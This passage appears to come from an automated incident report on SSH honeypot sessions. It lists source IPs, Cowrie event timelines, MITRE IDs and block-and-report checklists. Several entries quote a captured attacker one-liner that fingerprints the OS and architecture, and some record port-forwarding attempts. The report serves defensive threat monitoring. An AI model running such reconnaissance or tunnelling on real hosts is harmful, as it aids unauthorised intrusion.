| `2026-07-11 13:21:38` | `cowrie.client.version` |
| `2026-07-11 13:21:38` | `cowrie.client.kex` |
| `2026-07-11 13:21:40` | `cowrie.login.success` |
| `2026-07-11 13:21:40` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76e8169dcca

| Field | Detail |
|---|---|
| **Source IP** | `83.239.0[.]202` |
| **First Seen** | 2026-07-11 13:21 |
| **Last Seen** | 2026-07-11 13:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:21:50` | `cowrie.session.connect` |
| `2026-07-11 13:21:51` | `cowrie.client.version` |
| `2026-07-11 13:21:51` | `cowrie.client.kex` |
| `2026-07-11 13:21:52` | `cowrie.login.success` |
| `2026-07-11 13:21:52` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.0[.]202` to AbuseIPDB if not already reported
- [ ] Block `83.239.0[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c1ad810dc5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:22 |
| **Last Seen** | 2026-07-11 13:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:22:19` | `cowrie.session.connect` |
| `2026-07-11 13:22:20` | `cowrie.client.version` |
| `2026-07-11 13:22:20` | `cowrie.client.kex` |
| `2026-07-11 13:22:21` | `cowrie.login.success` |
| `2026-07-11 13:22:23` | `cowrie.session.params` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.success` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:23` | `cowrie.command.input` |
| `2026-07-11 13:22:24` | `cowrie.log.closed` |
| `2026-07-11 13:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-090216da630e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:24 |
| **Last Seen** | 2026-07-11 13:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:24:07` | `cowrie.session.connect` |
| `2026-07-11 13:24:07` | `cowrie.client.version` |
| `2026-07-11 13:24:07` | `cowrie.client.kex` |
| `2026-07-11 13:24:08` | `cowrie.login.success` |
| `2026-07-11 13:24:10` | `cowrie.session.params` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.success` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.command.input` |
| `2026-07-11 13:24:10` | `cowrie.log.closed` |
| `2026-07-11 13:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f588c316cc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 13:24 |
| **Last Seen** | 2026-07-11 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:24:45` | `cowrie.session.connect` |
| `2026-07-11 13:24:45` | `cowrie.client.version` |
| `2026-07-11 13:24:45` | `cowrie.client.kex` |
| `2026-07-11 13:24:46` | `cowrie.login.success` |
| `2026-07-11 13:24:47` | `cowrie.session.params` |
| `2026-07-11 13:24:47` | `cowrie.command.input` |
| `2026-07-11 13:24:47` | `cowrie.log.closed` |
| `2026-07-11 13:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06248cd8ff41

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 13:25 |
| **Last Seen** | 2026-07-11 13:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:25:06` | `cowrie.session.connect` |
| `2026-07-11 13:25:06` | `cowrie.client.version` |
| `2026-07-11 13:25:06` | `cowrie.client.kex` |
| `2026-07-11 13:25:06` | `cowrie.login.success` |
| `2026-07-11 13:25:06` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:25:06` | `cowrie.direct-tcpip.data` |
| `2026-07-11 13:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f284d6b9e4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:25 |
| **Last Seen** | 2026-07-11 13:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:25:52` | `cowrie.session.connect` |
| `2026-07-11 13:25:52` | `cowrie.client.version` |
| `2026-07-11 13:25:52` | `cowrie.client.kex` |
| `2026-07-11 13:25:55` | `cowrie.login.success` |
| `2026-07-11 13:25:57` | `cowrie.session.params` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.success` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:57` | `cowrie.command.input` |
| `2026-07-11 13:25:58` | `cowrie.log.closed` |
| `2026-07-11 13:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d3258785f3a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:27 |
| **Last Seen** | 2026-07-11 13:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:27:36` | `cowrie.session.connect` |
| `2026-07-11 13:27:37` | `cowrie.client.version` |
| `2026-07-11 13:27:37` | `cowrie.client.kex` |
| `2026-07-11 13:27:40` | `cowrie.login.success` |
| `2026-07-11 13:27:41` | `cowrie.session.params` |
| `2026-07-11 13:27:41` | `cowrie.command.input` |
| `2026-07-11 13:27:41` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.command.success` |
| `2026-07-11 13:27:42` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.command.input` |
| `2026-07-11 13:27:42` | `cowrie.log.closed` |
| `2026-07-11 13:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37009fe8a4aa

| Field | Detail |
|---|---|
| **Source IP** | `200.159.14[.]187` |
| **First Seen** | 2026-07-11 13:28 |
| **Last Seen** | 2026-07-11 13:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:28:49` | `cowrie.session.connect` |
| `2026-07-11 13:28:50` | `cowrie.client.version` |
| `2026-07-11 13:28:50` | `cowrie.client.kex` |
| `2026-07-11 13:28:52` | `cowrie.login.success` |
| `2026-07-11 13:28:52` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.159.14[.]187` to AbuseIPDB if not already reported
- [ ] Block `200.159.14[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e9f99c8a8d

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-07-11 13:29 |
| **Last Seen** | 2026-07-11 13:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:29:02` | `cowrie.session.connect` |
| `2026-07-11 13:29:02` | `cowrie.client.version` |
| `2026-07-11 13:29:02` | `cowrie.client.kex` |
| `2026-07-11 13:29:03` | `cowrie.login.success` |
| `2026-07-11 13:29:04` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ecb0a2a790

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:29 |
| **Last Seen** | 2026-07-11 13:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:29:18` | `cowrie.session.connect` |
| `2026-07-11 13:29:19` | `cowrie.client.version` |
| `2026-07-11 13:29:19` | `cowrie.client.kex` |
| `2026-07-11 13:29:21` | `cowrie.login.success` |
| `2026-07-11 13:29:23` | `cowrie.session.params` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.success` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.command.input` |
| `2026-07-11 13:29:23` | `cowrie.log.closed` |
| `2026-07-11 13:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00e82e37ba4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:31 |
| **Last Seen** | 2026-07-11 13:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:31:03` | `cowrie.session.connect` |
| `2026-07-11 13:31:03` | `cowrie.client.version` |
| `2026-07-11 13:31:03` | `cowrie.client.kex` |
| `2026-07-11 13:31:06` | `cowrie.login.success` |
| `2026-07-11 13:31:07` | `cowrie.session.params` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.success` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:07` | `cowrie.command.input` |
| `2026-07-11 13:31:09` | `cowrie.log.closed` |
| `2026-07-11 13:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35aac5b23258

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-07-11 13:32 |
| **Last Seen** | 2026-07-11 13:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:32:23` | `cowrie.session.connect` |
| `2026-07-11 13:32:24` | `cowrie.client.version` |
| `2026-07-11 13:32:24` | `cowrie.client.kex` |
| `2026-07-11 13:32:26` | `cowrie.login.success` |
| `2026-07-11 13:32:27` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26eee334a166

| Field | Detail |
|---|---|
| **Source IP** | `58.17.128[.]7` |
| **First Seen** | 2026-07-11 13:32 |
| **Last Seen** | 2026-07-11 13:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:32:32` | `cowrie.session.connect` |
| `2026-07-11 13:32:33` | `cowrie.client.version` |
| `2026-07-11 13:32:33` | `cowrie.client.kex` |
| `2026-07-11 13:32:35` | `cowrie.login.success` |
| `2026-07-11 13:32:35` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.128[.]7` to AbuseIPDB if not already reported
- [ ] Block `58.17.128[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c275f67b2a7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:32 |
| **Last Seen** | 2026-07-11 13:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:32:47` | `cowrie.session.connect` |
| `2026-07-11 13:32:48` | `cowrie.client.version` |
| `2026-07-11 13:32:48` | `cowrie.client.kex` |
| `2026-07-11 13:32:50` | `cowrie.login.success` |
| `2026-07-11 13:32:51` | `cowrie.session.params` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.success` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:51` | `cowrie.command.input` |
| `2026-07-11 13:32:52` | `cowrie.log.closed` |
| `2026-07-11 13:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-825f76310710

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:34 |
| **Last Seen** | 2026-07-11 13:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:34:34` | `cowrie.session.connect` |
| `2026-07-11 13:34:34` | `cowrie.client.version` |
| `2026-07-11 13:34:34` | `cowrie.client.kex` |
| `2026-07-11 13:34:36` | `cowrie.login.success` |
| `2026-07-11 13:34:37` | `cowrie.session.params` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.success` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:37` | `cowrie.command.input` |
| `2026-07-11 13:34:38` | `cowrie.log.closed` |
| `2026-07-11 13:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a87d3783a2b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 13:35 |
| **Last Seen** | 2026-07-11 13:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:35:05` | `cowrie.session.connect` |
| `2026-07-11 13:35:05` | `cowrie.client.version` |
| `2026-07-11 13:35:05` | `cowrie.client.kex` |
| `2026-07-11 13:35:05` | `cowrie.login.success` |
| `2026-07-11 13:35:05` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:35:05` | `cowrie.direct-tcpip.data` |
| `2026-07-11 13:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

